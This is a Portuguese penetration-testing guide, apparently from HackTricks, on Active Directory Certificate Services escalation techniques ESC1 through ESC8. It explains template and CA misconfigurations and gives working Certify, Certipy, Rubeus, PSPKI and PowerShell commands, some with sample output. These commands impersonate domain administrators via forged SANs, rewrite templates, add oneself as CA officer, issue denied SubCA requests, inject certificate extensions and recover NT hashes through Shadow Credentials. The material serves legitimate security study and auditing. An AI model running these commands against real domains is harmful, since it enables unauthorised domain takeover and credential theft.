# Escalonamento de domínio AD CS

{{#include ../../../banners/hacktricks-training.md}}


**Este é um resumo das seções sobre técnicas de escalonamento das publicações:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Modelos de certificado mal configurados - ESC1

### Explicação

### Modelos de certificado mal configurados - ESC1 explicado

- **A Enterprise CA concede direitos de inscrição a usuários com poucos privilégios.**
- **Não é necessária aprovação de um gerente.**
- **Não são necessárias assinaturas de pessoal autorizado.**
- **Os descritores de segurança dos modelos de certificado são permissivos demais, permitindo que usuários com poucos privilégios obtenham direitos de inscrição.**
- **Os modelos de certificado são configurados para definir EKUs que facilitam a autenticação:**
  - Estão incluídos identificadores de Extended Key Usage (EKU), como Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) ou nenhum EKU (SubCA).
- **O modelo permite que os solicitantes incluam um subjectAltName na Certificate Signing Request (CSR):**
  - Se houver um subjectAltName (SAN) no certificado, o Active Directory (AD) dá prioridade a ele na verificação da identidade. Isso significa que, ao especificar o SAN em uma CSR, é possível solicitar um certificado para se passar por qualquer usuário (por exemplo, um administrador do domínio). A possibilidade de o solicitante especificar um SAN é indicada pela propriedade `mspki-certificate-name-flag` do objeto do modelo de certificado no AD. Essa propriedade é uma bitmask, e a presença da flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` permite que o solicitante especifique o SAN.

> [!CAUTION]
> Essas configurações identificam um possível modelo ESC1, não um caminho de impersonação completo. Verifique se a principal de destino pode se inscrever em uma CA que publique o modelo, se a inscrição na CA é permitida e se o certificado emitido atende às regras rigorosas de mapeamento de SID do endpoint de autenticação. KDCs atuais com patches podem rejeitar uma UPN solicitada quando o SID do certificado não corresponde ao alvo; consulte [as orientações da Microsoft sobre mapeamento de certificados](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Direitos de inscrição concedidos a **Domain Computers** podem tornar uma identidade de computador preparada elegível, mesmo quando o usuário original não pode se inscrever. Avalie separadamente os direitos da principal do computador. Verifique `msPKI-Minimal-Key-Size` antes de fazer uma solicitação: um modelo que exige chaves RSA de 4096 bits rejeita o padrão de 2048 bits do cliente. Um SID de destino fornecido na solicitação pode resolver uma incompatibilidade de SID apenas quando a CA e o KDC aceitam o certificado resultante e seu mapeamento; nem as flags do modelo nem uma ACE de Enroll, por si só, comprovam isso.

Esse recurso às vezes é habilitado para permitir que produtos ou serviços de implantação gerem certificados HTTPS ou de host em tempo real, ou devido à falta de conhecimento.

Observa-se que criar um certificado com essa opção gera um aviso, o que não ocorre quando um modelo de certificado existente (como o modelo `WebServer`, que tem `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` habilitado) é duplicado e modificado para incluir um OID de autenticação.<sup>[[6]](#references)</sup>

### Abuso

Para **encontrar modelos de certificado vulneráveis**, você pode executar:

```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```

Para **abusar desta vulnerabilidade e se passar por um administrador**, pode-se executar:

```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
  /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
  -template 'ESC1' -upn 'administrator@corp.local'
```

Então, você pode transformar o **certificado gerado para o formato `.pfx`** e usá-lo para **autenticar-se novamente usando Rubeus ou certipy**:<sup>[[5]](#references)</sup>

```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```

Os binários do Windows "Certreq.exe" e "Certutil.exe" podem ser usados para gerar o PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

A enumeração dos templates de certificado no esquema de configuração da floresta do AD, especificamente daqueles que não exigem aprovação ou assinaturas, que possuem um EKU de Client Authentication ou Smart Card Logon e que têm a flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` habilitada, pode ser realizada executando a seguinte consulta LDAP:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```

## Modelos de certificado mal configurados - ESC2

### Explicação

O segundo cenário de abuso é uma variação do primeiro:

1. A Enterprise CA concede direitos de inscrição a usuários com poucos privilégios.
2. O requisito de aprovação do gerente está desabilitado.
3. A exigência de assinaturas autorizadas foi omitida.
4. Um descritor de segurança permissivo demais no modelo de certificado concede direitos de inscrição de certificados a usuários com poucos privilégios.
5. **O modelo de certificado está definido para incluir o EKU Any Purpose ou nenhum EKU.**

O **EKU Any Purpose** permite que um atacante obtenha um certificado para **qualquer finalidade**, incluindo autenticação de cliente, autenticação de servidor, assinatura de código etc. A mesma **técnica usada para ESC3** pode ser empregada para explorar esse cenário.

Certificados **sem EKUs**, que atuam como certificados de CA subordinada, podem ser explorados para **qualquer finalidade** e **também podem ser usados para assinar novos certificados**. Assim, um atacante poderia especificar EKUs ou campos arbitrários nos novos certificados utilizando um certificado de CA subordinada.

No entanto, novos certificados criados para **autenticação de domínio** não funcionarão se a CA subordinada não for confiável pelo objeto **`NTAuthCertificates`**, que é a configuração padrão. Ainda assim, um atacante pode criar **novos certificados com qualquer EKU** e valores arbitrários. Eles podem ser potencialmente **abusados** para diversas finalidades (por exemplo, assinatura de código, autenticação de servidor etc.) e ter implicações significativas para outras aplicações na rede, como SAML, AD FS ou IPSec.<sup>[[6]](#references)</sup>

Para enumerar modelos que correspondam a esse cenário no esquema de configuração da floresta do AD, é possível executar a seguinte consulta LDAP:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```

## Modelos de Agente de Inscrição mal configurados - ESC3

### Explicação

Este cenário é semelhante ao primeiro e ao segundo, mas **abusa** de um **EKU diferente** (Certificate Request Agent) e de **2 modelos diferentes** (portanto, tem 2 conjuntos de requisitos).

O **EKU Certificate Request Agent** (OID 1.3.6.1.4.1.311.20.2.1), conhecido como **Enrollment Agent** na documentação da Microsoft, permite que um principal **solicite** um **certificado** **em nome de outro usuário**.

O **“agente de inscrição”** solicita um **certificado** usando esse **modelo** e usa o **certificado resultante para co-assinar uma CSR em nome do outro usuário**. Em seguida, **envia** a **CSR co-assinada** à AC, solicitando um **certificado** usando um **modelo** que **permite “solicitações em nome de”**, e a AC responde com um **certificado pertencente ao “outro” usuário**.<sup>[[6]](#references)</sup>

**Requisitos 1:**

- A AC Enterprise concede direitos de solicitação a usuários com poucos privilégios.
- A exigência de aprovação do gerente foi omitida.
- Não há exigência de assinaturas autorizadas.
- O descritor de segurança do modelo de certificado é permissivo demais, concedendo direitos de solicitação a usuários com poucos privilégios.
- O modelo de certificado inclui o EKU Certificate Request Agent, permitindo solicitar certificados de outros modelos em nome de outros principais.

**Requisitos 2:**

- A AC Enterprise concede direitos de solicitação a usuários com poucos privilégios.
- A aprovação do gerente é ignorada.
- Um modelo de destino da versão 1 pode aceitar um agente de inscrição sem controles mais recentes e granulares de política de emissão; para a versão 2 ou mais recente, avalie os requisitos de emissão da política de aplicativo e as assinaturas autorizadas, em vez de excluir o modelo apenas com base na versão.
- Um EKU definido no modelo de certificado permite a autenticação no domínio.
- As restrições para agentes de inscrição não são aplicadas na AC.

O modelo de destino também deve ser publicado pela AC escolhida, permitir que a conta de destino solicite certificados e oferecer suporte ao uso pretendido para autenticação no domínio. Verifique os atributos obrigatórios de subject/SAN nessa conta; por exemplo, um modelo que cria um subject usando o email do AD não pode emitir certificados para uma conta sem o valor `mail` exigido. Um certificado de agente, por si só, não satisfaz esses requisitos do modelo de destino.

### Abuso

Você pode usar [**Certify**](https://github.com/GhostPack/Certify) ou [**Certipy**](https://github.com/ly4k/Certipy) para abusar deste cenário:<sup>[[4]](#references)</sup>

```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```

Os **usuários** autorizados a **obter** um **certificado de agente de inscrição**, os modelos nos quais os **agentes** de inscrição podem se inscrever e as **contas** em nome das quais o agente de inscrição pode atuar podem ser restringidos pelas CAs empresariais. Isso é feito abrindo o snap-in `certsrc.msc`, **clicando com o botão direito na CA**, **clicando em Properties** e, em seguida, **acessando** a guia “Enrollment Agents”.

No entanto, observa-se que a configuração **padrão** das CAs é “**Do not restrict enrollment agents**”. Quando os administradores habilitam a restrição de agentes de inscrição, definindo-a como “Restrict enrollment agents”, a configuração padrão continua extremamente permissiva. Ela permite que **Everyone** se inscreva em todos os modelos como qualquer pessoa.

### PoCs de PowerShell exclusivos do Windows com Certi-Bhai

[**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai) demonstra ESC1 e ESC2/ESC3 sem Certify ou Certipy. Seus scripts criam uma chave RSA exportável de 2048 bits com a API COM `X509Enrollment`, constroem uma solicitação PKCS#10, descobrem o primeiro `pKIEnrollmentService` por meio de LDAP, enviam a solicitação usando `CertificateAuthority.Request`, instalam a resposta em `Cert:\CurrentUser\My` e exportam um PFX codificado em Base64. O script ESC1 adiciona um SAN UPN escolhido pelo atacante (`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`, valor `0xb`), enquanto os scripts ESC2/ESC3 usam o primeiro certificado para assinar uma solicitação PKCS#7 em nome de outra pessoa.<sup>[[27]](#references)</sup>

```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
  -altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
  -target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```

Os scripts exibem o Base64 do **PFX**, que inclui a chave privada, para uso direto com Rubeus. Não o substitua por `[Convert]::ToBase64String($cert.RawData)`: `RawData` codifica apenas o certificado público e não pode assinar a solicitação PKINIT.<sup>[[5]](#references)[[27]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```

## Controle de Acesso Vulnerável ao Modelo de Certificado - ESC4

### **Explicação**

O **descritor de segurança** em **modelos de certificado** define as **permissões** que **principals do AD** específicos possuem sobre o modelo.

Se um **atacante** possuir as **permissões** necessárias para **alterar** um **modelo** e **implementar** quaisquer **configurações incorretas exploráveis** descritas nas **seções anteriores**, será possível facilitar a escalação de privilégios.

Entre as permissões relevantes para modelos de certificado estão:<sup>[[6]](#references)</sup>

- **Owner:** Concede controle implícito sobre o objeto, permitindo a modificação de quaisquer atributos.
- **FullControl:** Concede autoridade completa sobre o objeto, incluindo a capacidade de alterar quaisquer atributos.
- **WriteOwner:** Permite alterar o proprietário do objeto para um principal sob o controle do atacante.
- **WriteDacl:** Permite ajustar os controles de acesso, potencialmente concedendo FullControl ao atacante.
- **WriteProperty:** Autoriza a edição de quaisquer propriedades do objeto.

Revise também a DACL do contêiner `CN=Certificate Templates,CN=Public Key Services,CN=Services,...`. Uma ACE `CreateChild` aplicável e restrita à classe [`pKICertificateTemplate`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adsc/db4b45f7-e57a-4ae1-9b8f-1b107b69d98c), ou controle total amplo, pode permitir a criação de um novo objeto de modelo. A [documentação da Microsoft](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/9279abb2-3dfa-4631-845c-43c187ac4b44) informa que o contêiner armazena esses objetos de modelo. Revise as ACEs de negação correspondentes e a herança antes de determinar se a criação é efetiva. Um modelo criado não emite um certificado por si só: uma CA precisa publicá-lo, o principal solicitante precisa ter acesso de inscrição, e o certificado precisa ser mapeado para a identidade pretendida no endpoint de autenticação.

### Abuso

Para identificar principals com direitos de edição em modelos e outros objetos PKI, faça a enumeração com Certify:

```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```

Um exemplo de privesc como o anterior:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 ocorre quando um usuário tem privilégios de gravação sobre um template de certificado. Isso pode, por exemplo, ser explorado para sobrescrever a configuração do template de certificado e torná-lo vulnerável a ESC1.

Um template que já permite que o solicitante forneça o subject, mas tem apenas o uso Server Authentication, não é, por si só, um template para logon de usuário. Com direitos efetivos de controle do template, um atacante poderia alterar seus EKUs de autenticação ou suas políticas de aplicação antes de solicitar um certificado; [a Microsoft documenta a finalidade de entrada do EKU Smartcard Logon](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts). Verifique se uma CA publica o template modificado, se o solicitante pode se inscrever, se os requisitos de aprovação/assinatura foram atendidos e se o certificado emitido é mapeado para a conta pretendida. Em particular, [controladores de domínio corrigidos em Full Enforcement](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) rejeitam certificados sem mapeamento forte; adicionar o UPN do alvo a uma solicitação não contorna esse requisito.

Como podemos ver no caminho acima, apenas `JOHNPC` tem esses privilégios, mas nosso usuário `JOHN` tem a nova aresta `AddKeyCredentialLink` para `JOHNPC`. Como essa técnica está relacionada a certificados, também implementei esse ataque, conhecido como [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Aqui está uma pequena prévia do comando `shadow auto` do Certipy para recuperar o hash NT da vítima.

```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```

**Certipy** pode sobrescrever a configuração de um template de certificado com um único comando. Por **padrão**, o Certipy **sobrescreverá** a configuração para torná-la **vulnerável ao ESC1**. Também podemos especificar o parâmetro **`-save-old` para salvar a configuração antiga**, o que será útil para **restaurar** a configuração após nosso ataque.

```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```

## Controle de Acesso a Objetos PKI Vulneráveis - ESC5

### Explicação

A extensa rede de relações interconectadas baseadas em ACLs, que inclui vários objetos além dos modelos de certificado e da autoridade de certificação, pode afetar a segurança de todo o sistema AD CS. Esses objetos, que podem afetar significativamente a segurança, incluem:

- O objeto de computador do AD do servidor da CA, que pode ser comprometido por mecanismos como S4U2Self ou S4U2Proxy.
- O servidor RPC/DCOM do servidor da CA.
- Qualquer objeto ou contêiner descendente do AD no caminho específico do contêiner `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Esse caminho inclui, entre outros, contêineres e objetos como o contêiner Certificate Templates, o contêiner Certification Authorities, o objeto NTAuthCertificates e o Enrollment Services Container.

A segurança do sistema PKI pode ser comprometida se um invasor com poucos privilégios conseguir obter controle sobre qualquer um desses componentes críticos.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explicação

O assunto abordado na [**publicação da CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) também trata das implicações do sinalizador **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, conforme descrito pela Microsoft. Quando ativada em uma Autoridade de Certificação (CA), essa configuração permite incluir **valores definidos pelo usuário** no **nome alternativo do assunto** de **qualquer solicitação**, inclusive as criadas a partir do Active Directory®. Consequentemente, isso permite que um **invasor** solicite um certificado usando **qualquer modelo** configurado para **autenticação** de domínio — especificamente, os modelos que permitem que usuários **sem privilégios** solicitem certificados, como o modelo User padrão. Assim, é possível obter um certificado que permita ao invasor autenticar-se como administrador de domínio ou como **qualquer outra entidade ativa** no domínio.<sup>[[9]](#references)</sup>

**Observação**: A abordagem para adicionar **nomes alternativos** a uma Solicitação de Assinatura de Certificado (CSR), usando o argumento `-attrib "SAN:"` no `certreq.exe` (denominado “Name Value Pairs”), **difere** da estratégia de exploração de SANs no ESC1. A diferença está em **como as informações da conta são encapsuladas** — em um atributo do certificado, e não em uma extensão.

### Exploração

Para verificar se a configuração está ativada, as organizações podem usar o seguinte comando com `certutil.exe`:

```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```

Esta operação emprega essencialmente **acesso remoto ao registro**; portanto, uma abordagem alternativa poderia ser:

```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```

Ferramentas como [**Certify**](https://github.com/GhostPack/Certify) e [**Certipy**](https://github.com/ly4k/Certipy) são capazes de detectar essa configuração incorreta e explorá-la:<sup>[[4]](#references)</sup>

```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```

Para alterar essas configurações, supondo que se tenha direitos de **administrador do domínio** ou equivalentes, o seguinte comando pode ser executado em qualquer estação de trabalho:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

Para desativar essa configuração no seu ambiente, a flag pode ser removida com:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

> [!WARNING]
> Após as atualizações de segurança de maio de 2022, os **certificates** emitidos recentemente conterão uma **security extension** que incorpora a propriedade `objectSid` do **requester**. Para ESC1, esse SID é derivado do SAN especificado. No entanto, para **ESC6**, o SID corresponde ao `objectSid` do **requester**, não ao SAN.\
> Para explorar ESC6, é essencial que o sistema seja vulnerável a ESC10 (Weak Certificate Mappings), que prioriza o **SAN em relação à nova security extension**.

## Controle de acesso vulnerável da Certificate Authority - ESC7

### Ataque 1

#### Explicação

O controle de acesso de uma certificate authority é mantido por meio de um conjunto de permissões que regem as ações da CA. Essas permissões podem ser visualizadas acessando `certsrv.msc`, clicando com o botão direito em uma CA, selecionando as propriedades e, em seguida, acessando a guia Security. Além disso, as permissões podem ser enumeradas usando o módulo PSPKI com comandos como:

```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```

This fornece informações sobre os direitos principais, nomeadamente **`ManageCA`** e **`ManageCertificates`**, que correspondem às funções de “administrador da CA” e “gerente de certificados”, respetivamente.<sup>[[6]](#references)</sup>

#### Abuso

Ter direitos **`ManageCA`** numa autoridade de certificação permite ao principal manipular remotamente as definições usando o PSPKI. Isto inclui ativar ou desativar a flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`** para permitir a especificação de SAN em qualquer template, um aspeto crítico da escalada de domínio.

É possível simplificar este processo usando o cmdlet **Enable-PolicyModuleFlag** do PSPKI, que permite fazer alterações sem interação direta com a GUI.

Ter direitos **`ManageCertificates`** permite aprovar pedidos pendentes, contornando efetivamente a proteção “aprovação pelo gerente de certificados da CA”.

É possível utilizar uma combinação dos módulos **Certify** e **PSPKI** para solicitar, aprovar e descarregar um certificado:

```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```

### Ataque 2

#### Explicação

> [!WARNING]
> No **ataque anterior**, as permissões **`Manage CA`** foram usadas para **habilitar** a flag **EDITF_ATTRIBUTESUBJECTALTNAME2** e executar o **ataque ESC6**, mas isso não terá efeito até que o serviço da CA (`CertSvc`) seja reiniciado. Quando um usuário tem o direito de acesso `Manage CA`, ele também pode **reiniciar o serviço**. No entanto, isso **não significa que o usuário possa reiniciar o serviço remotamente**. Além disso, o **ESC6 pode não funcionar por padrão** na maioria dos ambientes com patches, devido às atualizações de segurança de maio de 2022.

Portanto, outro ataque é apresentado aqui.

Pré-requisitos:

- Apenas permissão **`ManageCA`**
- Permissão **`Manage Certificates`** (pode ser concedida a partir de **`ManageCA`**)
- O template de certificado **`SubCA`** deve estar **habilitado** (pode ser habilitado a partir de **`ManageCA`**)

A técnica se baseia no fato de que usuários com os direitos de acesso `Manage CA` _e_ `Manage Certificates` podem **emitir solicitações de certificado negadas**. O template de certificado **`SubCA`** é **vulnerável a ESC1**, mas **somente administradores** podem se inscrever no template. Assim, um **usuário** pode **solicitar** a inscrição no **`SubCA`** — o que será **negado** —, mas **depois a solicitação será emitida pelo gerente**.<sup>[[6]](#references)</sup>

#### Abuso

Você pode **conceder a si mesmo o direito de acesso `Manage Certificates`** adicionando seu usuário como um novo oficial.

```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```

O template **`SubCA`** pode ser **habilitado na CA** com o parâmetro `-enable-template`. Por padrão, o template `SubCA` está habilitado.

```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```

Se tivermos cumprido os pré-requisitos para este ataque, podemos começar **solicitando um certificado com base no modelo `SubCA`**.

**Essa solicitação será negad**a, mas salvaremos a chave privada e anotaremos o ID da solicitação.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```

Com nossas permissões **`Manage CA` e `Manage Certificates`**, podemos então **emitir a solicitação de certificado com falha** usando o comando `ca` e o parâmetro `-issue-request <request ID>`.

```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

E, por fim, podemos **recuperar o certificado emitido** com o comando `req` e o parâmetro `-retrieve <request ID>`.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

### Ataque 3 – Abuso da extensão Manage Certificates (SetExtension)

#### Explicação

Além dos abusos clássicos de ESC7 (habilitar atributos EDITF ou aprovar solicitações pendentes), o **Certify 2.0** revelou uma nova primitiva que exige apenas a função *Manage Certificates* (também chamada de **Certificate Manager / Officer**) na Enterprise CA.<sup>[[3]](#references)</sup>

O método RPC `ICertAdmin::SetExtension` pode ser executado por qualquer principal com a função *Manage Certificates*. Embora o método fosse tradicionalmente usado por CAs legítimas para atualizar extensões em solicitações **pendentes**, um atacante pode abusar dele para **adicionar uma extensão de certificado *não padrão*** (por exemplo, um OID personalizado de *Certificate Issuance Policy*, como `1.1.1.1`) a uma solicitação aguardando aprovação.

Como o template visado **não define um valor padrão para essa extensão**, a CA NÃO substituirá o valor controlado pelo atacante quando a solicitação for finalmente emitida. Portanto, o certificado resultante conterá uma extensão escolhida pelo atacante que pode:

* Atender aos requisitos de Application / Issuance Policy de outros templates vulneráveis (levando à escalada de privilégios).
* Injetar EKUs ou políticas adicionais que concedam ao certificado uma confiança inesperada em sistemas de terceiros.

Em resumo, *Manage Certificates* — antes considerada a metade “menos poderosa” de ESC7 — agora pode ser usada para obter escalada total de privilégios ou persistência de longo prazo, sem alterar a configuração da CA nem exigir o direito mais restritivo *Manage CA*.

#### Abusando da primitiva com Certify 2.0

1. **Envie uma solicitação de certificado que permaneça *pendente*.** Isso pode ser forçado usando um template que exige aprovação do gerente:
   ```powershell
   Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
   # Take note of the returned Request ID
   ```

2. **Anexe uma extensão personalizada à solicitação pendente** usando o novo comando `manage-ca`:
   ```powershell
   Certify.exe manage-ca --ca SERVER\\CA-NAME \
                     --request-id 1337 \
                     --set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
   ```
   *Se o template ainda não definir a extensão *Políticas de Emissão de Certificados*, o valor acima será preservado após a emissão.*

3. **Emita a solicitação** (se sua função também tiver direitos de aprovação *Manage Certificates*) ou aguarde um operador aprová-la. Depois de emitido, baixe o certificado:
   ```powershell
   Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
   ```

4. O certificado resultante agora contém o OID de política de emissão malicioso e pode ser usado em ataques subsequentes (por exemplo, ESC13, escalada de domínio etc.).

> NOTA: O mesmo ataque pode ser executado com Certipy ≥ 4.7 usando o comando `ca` e o parâmetro `-set-extension`.

## NTLM Relay para endpoints HTTP do AD CS – ESC8

### Explicação

> [!TIP]
> Em ambientes onde o **AD CS está instalado**, se houver um **endpoint de web enrollment vulnerável** e pelo menos um **certificate template publicado** que permita **o enrollment de computadores do domínio e a autenticação de cliente** (como o template padrão **`Machine`**), um atacante pode comprometer **qualquer computador com o serviço spooler ativo**!

O AD CS oferece suporte a vários **métodos de enrollment baseados em HTTP**, disponibilizados por meio de funções de servidor adicionais que os administradores podem instalar. Essas interfaces de enrollment de certificados baseadas em HTTP são suscetíveis a **ataques NTLM Relay**. A partir de uma **máquina comprometida, um atacante pode se passar por qualquer conta do AD que se autentique por NTLM de entrada**. Enquanto se passa pela conta da vítima, o atacante pode acessar essas interfaces web para **solicitar um certificado de autenticação de cliente usando os certificate templates `User` ou `Machine`**.

- A **interface de web enrollment** (um aplicativo ASP antigo disponível em `http://<caserver>/certsrv/`) usa HTTP por padrão, o que não oferece proteção contra ataques NTLM Relay. Além disso, ela permite explicitamente apenas autenticação NTLM por meio do cabeçalho HTTP Authorization, tornando inaplicáveis métodos de autenticação mais seguros, como Kerberos.
